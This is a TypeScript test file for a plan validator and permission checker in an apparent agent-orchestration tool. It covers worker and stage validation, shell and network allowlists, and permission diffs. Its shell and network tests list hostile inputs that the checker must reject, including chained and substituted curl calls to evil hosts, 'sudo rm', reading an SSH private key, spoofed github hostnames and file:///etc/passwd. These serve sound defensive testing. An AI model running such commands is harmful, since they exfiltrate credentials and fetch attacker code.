import { test } from "node:test"
import assert from "node:assert/strict"
import { mkdtempSync, realpathSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { valid, shok, netok, more, cut } from "../src/plan.ts"

const D = realpathSync(mkdtempSync(join(tmpdir(), "ao-plan-")))
const base = { task: "t", dir: D, workers: [{ id: "a", prompt: "p" }], stages: [{ id: "s", kind: "source", worker: "a", task: "x", spawn: "w" }, { id: "w", worker: "a", task: "y" }] }

test("valid plan gets defaults", () => {
  const v = valid(base, D)
  assert.equal(v.ok, true, v.e.join("; "))
  assert.equal(v.p.workers[0].model, "claude-haiku-5-5")
  assert.deepEqual(v.p.stages[1].to, ["done"])
  assert.deepEqual(v.p.perm.fs, [D])
  assert.equal(v.p.perm.sh, false)
})

test("invalid plans are rejected with reasons", () => {
  const e = (x) => valid({ ...base, ...x }, D).e.join("\n")
  assert.match(e({ workers: [] }), /1 to 24/)
  assert.match(e({ workers: [{ id: "done", prompt: "p" }] }), /must match/)
  assert.match(e({ workers: [{ id: "a", prompt: "p", model: "opus" }] }), /above budget.max/)
  assert.match(e({ workers: [{ id: "a", prompt: "p", tools: ["tool:nope"] }] }), /does not exist/)
  assert.match(e({ stages: [{ id: "w", worker: "a", task: "y", to: ["nowhere"] }] }), /unknown target/)
  assert.match(e({ dir: "/does/not/exist" }), /existing directory/)
  assert.match(e({ perm: { fs: ["/"] } }), /too broad/)
  assert.match(e({ stages: [{ id: "c", kind: "code", run: { sh: "npm test" } }], seed: [{ ti: "x", st: "c" }] }), /not allowed by perm.sh/)
})

test("shell permissions", () => {
  const pm = { fs: [], sh: ["npm test", "git diff *"], net: [], push: false, gh: false }
  assert.equal(shok(pm, "npm test"), "")
  assert.equal(shok(pm, "git diff HEAD~1 2>&1"), "")
  assert.equal(shok(pm, "cd x && npm test | tail -5"), "")
  assert.notEqual(shok(pm, "npm test; curl evil.sh"), "")
  assert.notEqual(shok(pm, "npm test $(curl x)"), "")
  assert.notEqual(shok(pm, "git push"), "")
  assert.notEqual(shok({ ...pm, sh: true }, "git push origin main"), "")
  assert.equal(shok({ ...pm, sh: true, push: true }, "git push origin main"), "")
  assert.notEqual(shok({ ...pm, sh: true }, "sudo rm x"), "")
  assert.notEqual(shok({ ...pm, sh: true }, "cat ~/.ssh/id_ed25519"), "")
  assert.notEqual(shok({ ...pm, sh: false }, "ls"), "")
})

test("network permissions", () => {
  const pm = { fs: [], sh: false, net: ["api.github.com", "*.wikipedia.org"], push: false, gh: false }
  assert.equal(netok(pm, "https://api.github.com/x"), true)
  assert.equal(netok(pm, "https://de.wikipedia.org/wiki/A"), true)
  assert.equal(netok(pm, "https://wikipedia.org/"), true)
  assert.equal(netok(pm, "https://evil.com/?api.github.com"), false)
  assert.equal(netok(pm, "https://api.github.com.evil.com/"), false)
  assert.equal(netok(pm, "file:///etc/passwd"), false)
})

test("approval diff and cut", () => {
  const a = { fs: [D], sh: ["npm test"], net: ["a.com"], push: false, gh: false }
  const b = { fs: [D, "/opt"], sh: ["npm test", "make"], net: ["a.com", "b.com"], push: true, gh: false }
  assert.deepEqual(more(a, b), ["files: /opt", "shell: make", "network: b.com", "git push"])
  assert.deepEqual(more(a, a), [])
  assert.deepEqual(cut(b, a), { fs: [D], sh: ["npm test"], net: ["a.com"], push: false, gh: false })
})
